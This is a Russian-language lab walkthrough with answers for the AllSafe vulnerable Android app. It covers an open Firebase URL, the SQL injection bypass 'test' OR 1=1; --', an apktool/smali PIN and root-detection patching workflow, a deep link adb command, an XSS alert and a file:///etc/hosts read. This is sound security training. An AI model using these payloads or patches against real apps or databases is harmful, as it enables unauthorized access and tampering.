# Практика 2. AllSafe

## Firebase Database

Для доступа к Firebase может помочь поиск **Ctrl+Shift+F**:


<details>
<summary>Hint</summary>

1. Выполнить поиск по всем ресурсам (не по коду) — использовать **Ctrl+Shift+F**.

2. Файл должен найтись где-то в 
   ```
   /res/values/strings.xml
   ```
3. Находим URL базы данных и добавляем к нему `/.json`

<details>
<summary>Ответ</summary>

**В итоге получим**
```
https://allsafe-8cef0.firebaseio.com/.json
```
</details>
</details>


---

## SQL Injection

В данном задании нужно создать SQLi-пайлоад для обхода аутентификации.

<details>
<summary>Ответ</summary>

**Использyемый пайлоад:**
```sql
test' OR 1=1; --
```

Этот пайлоад позволяет обойти проверку аутентификации.
</details>

---

## Pin Bypass

Ищем место, где проверяется PIN и переходим к патчингу

**Hint:** Может помочь поиск `CheckPin`

Как запатчить приложение:

| Шаг | Команда | Описание |
|-----|---------|----------|
| 1 | `apktool d name.apk --no-res` | Декомпиляция приложения |
| 2 | `code name` | Открытие декомпилированного проекта в Code Editor |
| 3 | используем метод внимательного взгляда | Поиск нужного участка в smali-байт-коде и его модификация |
| 4 | `apktool b name -o new.apk` | Сборка приложения обратно |
| 5 | `java -jar uber-apk-signer.jar --apk new.apk` | Подпись приложения (**не забывать про выходной файл**) |
| 6 | `adb install new.apk` | Удаление старой версии приложения (Android может отказаться устанавливать приложение с другой подписью) и установка запатченного приложения|

---

## Root Detection

**Находим класс, в котором проверяется наличие root:**
```
allsafe/smali_classes4/infosecadventures/allsafe/challenges/RootDetection.smali
```

В коде находим место, которое можно запатчить:

```smali
invoke-virtual {v0}, Lcom/scottyab/rootbeer/RootBeer;->isRooted()Z
move-result v0
const-string v1, "requireActivity(...)"
if-eqz v0, :cond_0
```

Необходимо модифицировать данный участок кода для обхода обнаружения root.

---

## Deep Link Exploitation

1. Ищем схему в `AndroidManifest.xml`, по которой можно обратиться


<details>
<summary>Hint</summary>

2. Находим схему `allsafe:` рядом с которой расположены хост и эндпоинт.

3. Формируем запрос для отправки

   ```bash
   adb shell am start -W -a android.intent.action.VIEW -d allsafe://infosecadventures/congrats
   ```

Подбираем параметр на основе сообщений, которые отдаёт приложение

<details>
<summary>Ответ</summary>

   ```bash
   adb shell am start -W -a android.intent.action.VIEW -d allsafe://infosecadventures/congrats?key=find_it_by_yourself
   ```
</details>
</details>


---

## Vulnerable WebView

1. Подумай, каким образом можно вывести алерт на экран (может помочь XSS)

<details>
<summary>Ответ</summary>

**Показ алерта (XSS):**
   ```html
   <script>alert('test')</script>
   ```

</details>


2. Попробуй получить доступ к локальным файлам или выйти в интернет:

<details>
<summary>Ответ</summary>

   ```
   file:///etc/hosts
   ```

</details>

---
